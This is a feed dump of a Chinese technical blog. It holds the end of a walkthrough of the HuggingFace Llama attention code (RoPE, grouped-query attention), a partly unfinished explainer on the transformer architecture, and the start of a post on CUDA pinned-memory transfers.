mtight">∗</span><span class="mord mathnormal mtight">h</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">d</span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">im</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">hi</span><span class="mord mathnormal mtight">dd</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mord mtight" style="margin-right:0.02778em;">_</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">ze</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.464em;"><span></span></span></span></span></span></span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params"></span><br><span class="hljs-params">    self,</span><br><span class="hljs-params">    hidden_states: torch.Tensor,</span><br><span class="hljs-params">    attention_mask: <span class="hljs-type">Optional</span>[torch.Tensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    position_ids: <span class="hljs-type">Optional</span>[torch.LongTensor] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    past_key_value: <span class="hljs-type">Optional</span>[<span class="hljs-type">Tuple</span>[torch.Tensor]] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">    output_attentions: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,</span><br><span class="hljs-params">    use_cache: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>,</span><br><span class="hljs-params">    **kwargs,</span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-type">Tuple</span>[torch.Tensor, <span class="hljs-type">Optional</span>[torch.Tensor], <span class="hljs-type">Optional</span>[<span class="hljs-type">Tuple</span>[torch.Tensor]]]:<br>  bsz, q_len, _ = hidden_states.size()<br><br>  <span class="hljs-keyword">if</span> self.config.pretraining_tp &gt; <span class="hljs-number">1</span>:<br>    key_value_slicing = (self.num_key_value_heads * self.head_dim) // self.config.pretraining_tp<br>    query_slices = self.q_proj.weight.split(<br>        (self.num_heads * self.head_dim) // self.config.pretraining_tp, dim=<span class="hljs-number">0</span><br>    )<br>    key_slices = self.k_proj.weight.split(key_value_slicing, dim=<span class="hljs-number">0</span>)<br>    value_slices = self.v_proj.weight.split(key_value_slicing, dim=<span class="hljs-number">0</span>)<br><br>    query_states = [F.linear(hidden_states, query_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)]<br>    query_states = torch.cat(query_states, dim=-<span class="hljs-number">1</span>)<br><br>    key_states = [F.linear(hidden_states, key_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)]<br>    key_states = torch.cat(key_states, dim=-<span class="hljs-number">1</span>)<br><br>    value_states = [F.linear(hidden_states, value_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)]<br>    value_states = torch.cat(value_states, dim=-<span class="hljs-number">1</span>)<br><br>  <span class="hljs-keyword">else</span>:<br>    query_states = self.q_proj(hidden_states)<br>    key_states = self.k_proj(hidden_states)<br>    value_states = self.v_proj(hidden_states)<br></code></pre></td></tr></table></figure><p><strong>RoPE 位置编码</strong></p><p>准备好 <code>query_states</code>、<code>key_states</code>、<code>value_states</code> 线性层后，紧接着就是将输入张量加上旋转矩阵位置编码。但在一切开始之前，注意到 1-3 行将张量的维度做了很大的变化。以 <code>query_states</code> 为例，原先的维度是 <code>(num_heads*head_dim, hidden_size)</code>，现在将维度 view 后接转置成了 <code>(batch_size, num_heads, seq_len, head_dim)</code>。同理与其他 states，于是下一行的 <code>kv_seq_len</code> 为何取 <code>shape[-2]</code> 就可以理解了。上文提及过，位置编码的余弦值和正弦值计算完成后，<code>apply_rotary_pos_emb</code> 在这里被调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ... to be continued</span><br>query_states = query_states.view(bsz, q_len, self.num_heads, self.head_dim).transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>key_states = key_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim).transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>value_states = value_states.view(bsz, q_len, self.num_key_value_heads, self.head_dim).transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><br>kv_seq_len = key_states.shape[-<span class="hljs-number">2</span>]<br><span class="hljs-comment"># ...</span><br>cos, sin = self.rotary_emb(value_states, seq_len=kv_seq_len)<br>query_states, key_states = apply_rotary_pos_emb(query_states, key_states, cos, sin, position_ids)<br></code></pre></td></tr></table></figure><p>注意，不同于原先的 transformer 架构，<code>LlamaAttention</code> 在每次前推注意力机制时都会加上位置编码。</p><p><strong>Grouped-Query Attention</strong></p><p>接着往下看，抛开 <code>past_key_value</code> 的部分，直接跳到第9-10行，注意此时 kv 状态张量的维度是 <code>(batch_size, num_kv_heads, kv_seq_len, head_dim)</code>，而经过 <code>repeat_kv</code> 函数的操作后，kv 状态张量变成了 <code>(batch_size, num_kv_heads*num_kv_groups, kv_seq_len, head_dim)</code>，也就是说，内部的权重被复制了 <code>num_kv_groups</code> 遍。具体过程会在后续列出。而再对比一下 <code>query_states</code> 的维度，这意味着同一组的 query 会共享同一个 kv 权重。这就是 llama2 提出的 Grouped-Query Attention 技术，这可以减少权重的内存开销，而实验表明，这样处理后模型的精度不会差很多。</p><p>最后，在第 12 行完成了 <code>torch.matmul</code> 执行 QK 矩阵相乘，得到注意力机制权重。从QK两者的维度我们不难得出，<code>attn_weights</code> 的维度是 <code>(batch_size, num_heads, seq_len, kv_seq_len)</code>。这一步完成了公式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><msub><mi>d</mi><mi>k</mi></msub></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\frac{QK^T}{\sqrt{d_k}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6275em;vertical-align:-0.538em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0895em;"><span style="top:-2.5864em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8622em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.8222em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1778em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Q</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9191em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.538em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>的计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> past_key_value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>  <span class="hljs-comment"># reuse k, v, self_attention</span><br>  key_states = torch.cat([past_key_value[<span class="hljs-number">0</span>], key_states], dim=<span class="hljs-number">2</span>)<br>  value_states = torch.cat([past_key_value[<span class="hljs-number">1</span>], value_states], dim=<span class="hljs-number">2</span>)<br><br>past_key_value = (key_states, value_states) <span class="hljs-keyword">if</span> use_cache <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>key_states = repeat_kv(key_states, self.num_key_value_groups)<br>value_states = repeat_kv(value_states, self.num_key_value_groups)<br><br>attn_weights = torch.matmul(query_states, key_states.transpose(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)) / math.sqrt(self.head_dim)<br></code></pre></td></tr></table></figure><p>这里有 <code>repeat_kv</code> 函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeat_kv</span>(<span class="hljs-params">hidden_states: torch.Tensor, n_rep: <span class="hljs-built_in">int</span></span>) -&gt; torch.Tensor:<br>  <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  This is the equivalent of torch.repeat_interleave(x, dim=1, repeats=n_rep). The hidden states go from (batch,</span><br><span class="hljs-string">  num_key_value_heads, seqlen, head_dim) to (batch, num_attention_heads, seqlen, head_dim)</span><br><span class="hljs-string">  &quot;&quot;&quot;</span><br>  batch, num_key_value_heads, slen, head_dim = hidden_states.shape<br>  <span class="hljs-keyword">if</span> n_rep == <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">return</span> hidden_states<br>  hidden_states = hidden_states[:, :, <span class="hljs-literal">None</span>, :, :].expand(batch, num_key_value_heads, n_rep, slen, head_dim)<br>  <span class="hljs-keyword">return</span> hidden_states.reshape(batch, num_key_value_heads * n_rep, slen, head_dim)<br></code></pre></td></tr></table></figure><p>输入的张量在2维度复制了一份，因此所有比2维度低的数据（即 <code>None</code> 后低维度的数据）都复制了 <code>n_rep</code> 遍，最后这些数据会被合并到1维度上。因而最后得到的张量维度是 <code>(batch_size, num_kv_heads*num_kv_groups, seq_len, head_dim)</code>，其中2、3维度的数据被复制了 <code>n_rep</code> 遍。就如同下图所示的那样。</p><center>  <img src="/img/LLM/grouped-query attention.png"></center><p><strong>收尾</strong></p><p>接着往下看：第7行表示若存在 <code>attention_mask</code> 则需要将其加到权重上，这与 transformer decoder 的行为一致。因为咱们这次仅关注 forward 过程，不涉及训练，在推理生成文本序列时，<code>attention_mask</code> 的作用就是防止 decoder 受到未生成张量的影响。10 行将得到的权重放入 <code>softmax</code> 激活函数，11 行再将注意力权重与 v 状态张量相乘，从而完成了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mfrac><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><msub><mi>d</mi><mi>k</mi></msub></msqrt></mfrac><mo stretchy="false">)</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">softmax(\frac{QK^T}{\sqrt{d_k}})V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6275em;vertical-align:-0.538em;"></span><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0895em;"><span style="top:-2.5864em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8622em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.8222em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1778em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4461em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Q</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9191em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.538em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>运算。这就完成了该子层的运算，该子层的输出就是下一层的输入。因此输出张量的维度必然与输入维度一致，所以16行将原先被转置的矩阵重新拨回来，17行又将张量变成了 <code>(batch_size, seq_len, hidden_size)</code>。</p><p>最后在 19-22 行，因为上面的计算步骤其实是 TP 的，因此最后还要将结果合并。注意，21行还会经过一个线性层。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> attention_mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>  <span class="hljs-comment"># if attention_mask.size() != (bsz, 1, q_len, kv_seq_len):</span><br>  attn_weights = attn_weights + attention_mask<br><br><span class="hljs-comment"># upcast attention to fp32</span><br>attn_weights = nn.functional.softmax(attn_weights, dim=-<span class="hljs-number">1</span>, dtype=torch.float32).to(query_states.dtype)<br>attn_output = torch.matmul(attn_weights, value_states)<br><br><span class="hljs-keyword">if</span> attn_output.size() != (bsz, self.num_heads, q_len, self.head_dim):<br>  <span class="hljs-comment"># raise ValueError</span><br><br>attn_output = attn_output.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>).contiguous()<br>attn_output = attn_output.reshape(bsz, q_len, self.hidden_size)<br><br><span class="hljs-keyword">if</span> self.config.pretraining_tp &gt; <span class="hljs-number">1</span>:<br>    attn_output = attn_output.split(self.hidden_size // self.config.pretraining_tp, dim=<span class="hljs-number">2</span>)<br>    o_proj_slices = self.o_proj.weight.split(self.hidden_size // self.config.pretraining_tp, dim=<span class="hljs-number">1</span>)<br>    attn_output = <span class="hljs-built_in">sum</span>([F.linear(attn_output[i], o_proj_slices[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.config.pretraining_tp)])<br><span class="hljs-keyword">else</span>:<br>    attn_output = self.o_proj(attn_output)<br><br><span class="hljs-keyword">return</span> attn_output, attn_weights, past_key_value<br></code></pre></td></tr></table></figure><p>至此，咱们已经分析完 llama 所有的基本组件。让我们再次回到这个架构图，细细回味一下张量在前推过程中经历的所有。</p><center><img src="/img/LLM/llama.png"></center><h4 id="关于-FlashAttention2">关于 FlashAttention2</h4><h2 id="小结">小结</h2><p>本文从 llama 是什么出发，深入解读了 huggingface 框架对 llama 的代码实现。我先从 llama 论文开始解读，试图让所有未接触过大模型的外行人能理解大模型是用什么训练而成的。随后，我介绍了 llama 的架构图，并简要说明了 llama1/2 和 transformer 框架的区别，以及为何要这样改进。本博客重点分析了 llama 的各个基件和中间件，从底至上地分析了 hugginface llama 的实现，由于我也是第一次如此细致地阅读大模型的代码，因此很多地方可能会比较啰嗦。但万事开头难，在研究的最初阶段尽可能搞清楚最基本的东西，步步为营方能豁然开朗。下一篇论文将介绍 llama 每一层的实现与组合，主要是利用本篇博客中介绍的组件搭建起译码层的故事，并借此说明大模型推理的主要流程。当然，我不可能面面俱到地介绍所有细节，但也能揭开大模型的神秘面纱，从中瞥见一些人工智能的奥秘。</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>Transformer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大话 transformer 架构</title>
    <link href="/2023/10/22/2023-10-22-transformer/"/>
    <url>/2023/10/22/2023-10-22-transformer/</url>
    
    <content type="html"><![CDATA[<h1>大话 transformer 架构</h1><h2 id="前言">前言</h2><p>去年 OpenAI 发布的 ChatGPT3 开启了新一轮对 AI 研究的热潮，不过，这一切的故事还要从 2017 年（甚至更早）说起。自从 deepMind 团队发表的 <a href="https://arxiv.org/abs/1706.03762">“Attention is all your need”</a> 论文提出了 transformer 架构后，绝大部分有影响力模型的基础架构都基于的 transformer（比如基于 decode 的GPT、基于 encode 的 BERT、基于 encode-decode 的 T5 等等），具体有哪些模型可以来看看 <a href="https://huggingface.co/docs/transformers/index?continueFlag=321d881f02dc7278f7538eb190d77134">huggingface 罗列的</a></p><h2 id="故事的开始">故事的开始</h2><p>与大多数博客一样，我们需要请出论文中最有名的架构图来解释 transformer：</p><center><img src="/img/LLM/transformer.png"></center><p>上面的架构图可以简单地分成两个部分，encoder（左边）和 decoder（右边）。而组成他们的组件又有一些共通之处，因此 transformer 架构其实没有大家想的那样复杂。</p><p>虽然现在 transformer 被应用于非常多的 AI 领域，但起初它是在自然语言处理 (NLP) 中针对序列到序列 (seq2seq) 的任务被提出的。所谓的 seq2seq ，可以简单地理解为自然语言翻译：将一串中文翻译成一串英文，对于计算机而言就是程序将一串字符串转换到了另一串字符串。我们将以此为背景讨论 transformer，希望能对刚入门的新人有所帮助。</p><h2 id="encoder-decoder-初理解">encoder &amp; decoder 初理解</h2><p>在翻译外语时，我们的大脑通常先读入原语言的文字，并理解出文字的大意，然后再输出成对应的语言。而 transformer 的运行过程与上述情况很类似。transformer 的 encoder（中文译：编码器）负责流程的前半部分，读入文字，“编码地”理解文字大意，而 decoder（中文译：解码器）负责在知晓文字大意后，“解码地”将意思用目标语言输出。</p><p>将上述过程用数学描述，即为：</p><p>encoder 将输入的文字序列 {$ x_1, x_2, … x_n <span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 1: }̲ 映射为 {'>} 映射为 {</span> z_1, z_2, …, z_n <span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;}&#039; at position 1: }̲（transformer 自己…'>}（transformer 自己的理解大意），decoder 拿到 encoder 的输出，在知晓文字大意后，会生成一个文字序列 {</span> y_1, y_2, … , y_m $}。</p><p>注意到，encoder 可以一次性看到所有的输入（就如同人们翻译文字时必须根据上下文意思理解原文）但 decoder 只能一个一个的输出，并且还需要根据自己上一个的输出确定自己的本次输出（像极了翻译时一字一句写下外文的样子），因此是一个自回归模型。</p><h2 id="深入编码器">深入编码器</h2><h3 id="基本数据流">基本数据流</h3><p>将目标聚焦到架构图的左边，注意到，encoder 由 N 个相同的模块组成，而最下面是模型的入口。输入 inputs 可以简单地理解为读入的文字序列，它需要经过 Input Embedding 和 Positional Encoding 地处理（这些我们稍后会讨论），再进入到编码器中。数据流进入编码器后，一方面会兵分三路进入到多头注意力块 (multi-head Attention)，另一方面会使用<a href="https://zhuanlan.zhihu.com/p/42833949">残差连接</a>将原始输入添加到输出中，最后执行归一化操作。随后，数据会进入第二个子层 Feed Forward，也就是全连接层，然后再执行残差连接和归一化操作。得到的输出作为下一编码层的输入，再重复上述运算，如此操作 N 次，即完成了对文本的编码。</p><center><img src="/img/LLM/transformer_encoder.png"></center><h3 id="注意力机制">注意力机制</h3><h3 id="多头注意力">多头注意力</h3><p>随后，数据会进入第二个子层 Feed Forward，也就是全连接层。</p><p>残差连接需要输入和输出的维度一致，所以每一层的输出维度在transformer里都是固定的，都是512维。</p><p>可以看到整个结构的超参数设计非常的简单，只需要调节N和输出的维度就可以了，可以衍生出后续的一系列网络设计，诸如BERT和GPT等等。</p><p>残差连接在 Transformer 架构中至关重要。</p><p>1、首先，与 ResNet 类似，Transformers 层级很深。某些模型的编码器中包含超过 24 个 blocks。因此，残差连接对于模型梯度的平滑流动至关重要。</p><p>2、如果没有残余连接，原始序列的信息就会丢失。多头注意力层忽略序列中元素的位置，并且只能根据输入特征来学习它。删除残余连接意味着该信息在第一个注意层之后（初始化之后）丢失，并且使用随机初始化的查询和键向量，位置 i 的输出向量与其原始输入无关。注意力的所有输出都可能表示相似/相同的信息，并且模型没有机会区分哪些信息来自哪个输入元素。</p><p>归一化层在 Transformer 架构中也发挥着重要作用，它可以实现更快的训练速度。</p><p>除了多头注意力之外，模型中还包括一个小型全连接前馈网络，应用于每一个 block。它增加了模型的复杂度，并允许单独对每个序列元素进行转换。</p><p><img src="/img/LLM/encoder_decoder.png" alt=""></p><p><img src="https://pic3.zhimg.com/80/v2-89c3f1cbaf99ea0bf397d450908f5f0a_720w.webp" alt=""></p><h3 id="残差连接">残差连接</h3><h3 id="归一化">归一化</h3><h3 id="MLP">MLP</h3><h2 id="深入解码器">深入解码器</h2><h3 id="基本数据流-2">基本数据流</h3><center><img src="/img/LLM/transformer_decoder.png"></center><h3 id="Masked-注意力机制">Masked 注意力机制</h3><h2 id="位置编码与嵌入技术">位置编码与嵌入技术</h2>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>transformer</tag>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CUDA 进阶之内存优化</title>
    <link href="/2023/09/10/2023-9-10-cuda-mem/"/>
    <url>/2023/09/10/2023-9-10-cuda-mem/</url>
    
    <content type="html"><![CDATA[<h1>CUDA 进阶之内存优化 关于主机与设备间的数据传输</h1><h2 id="前言">前言</h2><p>内存优化是性能优化主题中最重要的部分，其目标是通过最大化带宽来提高硬件的使用率和满载率。在具体实践中，我们期望尽可能多地使用快速内存，而尽可能少地使用慢速内存。本博客主要讨论主机与设备间的数据迁移以及涉及到的各种内存，并试图回答如何最好地设置、使用内存以提高 CUDA 程序的运行效率这一问题。</p><p>以英伟达的 V100 设备为例，设备间内存的理论最大带宽（898 GB/s）远比设备与主机间的理论最大带宽（16 GB/s for PCIe3x16）快得多。因此，为获得最佳性能，应尽量减少主机与设备间的数据传输，即使是 GPU 上运行的内核与主机的 CPU 相比没有任何优势。更多情况下，我们应在设备内存中创建中间数据结构， 交由设备计算，最后在没有映射到主机内存的情况下销毁。</p><p>此外，由于每次传输都有相关的固定开销，因此将许多小数据包装成一个较大的数据包进行传输，会比多次传输小数据包要好得多！即使这样做需要：1）将不连续的内存区域打包到一个连续的缓冲区，2）消耗一定资源来封装和解封。</p><p>最后，主机和设备之间的高带宽通常是通过 page-locked（或 pinned）来实现，接下来我们将重点阐述 pinned 内存。</p><h2 id="pinned-内存">pinned 内存</h2><h3 id="原理">原理</h3><p>pinned 内存有时也会被称作为页锁定内存，或者固定内存。本文中皆以 pinned 内存指代。</p><p>pinned 内存是相对于一般的页可分配内存而言的。一般地，主机上的内存都会被操作系统采用分页机制管理，我们平时编程中遇到的“地址”事实上都是虚拟地址，需要通过地址转换才能获得物理地址（有时甚至不在物理内存中，会发生缺页），进而获得数据。</p><p>因此对于页可分配内存，由于 GPU 获得的地址是虚拟内存的地址，不可直接获得对应物理内存页上的数据，因此要想实现主机与设备间的数据传输，必须先将页可分配内存上的数据转移到一个临时的 pinned 内存页上，再实现内存传输，如下图。</p><p><img src="https://developer-blogs.nvidia.com/wp-content/uploads/2012/12/pinned-1024x541.jpg" alt=""></p><p>而对于 pinned 内存，操作系统不会对其进行分页和交换操作，其内存页会被“固定存储”在物理内存中，GPU 获得的地址就是物理地址，因此可直接通过 DMA 机制在主机和 GPU 之间快速传输数据。</p><p>正因如此，pinned 内存传输速率接近理论峰值。例如，在使用 PCIe3x16 的机器上，pinned 内存可以达到大约 12 GB/s 的传输速率。</p><h3 id="使用">使用</h3><p>pinned 内存是使用 <code>cudaHostAlloc()</code> 分配，使用 <code>cudaFreeHost()</code> 回收。对于那些已经被分配的内存区域，可使用 <code>cudaHostRegister()</code> 来 pin 住内存，无需重新分配单独的 pinned 内存再将数据拷入其中。</p><p>虽然 pinned 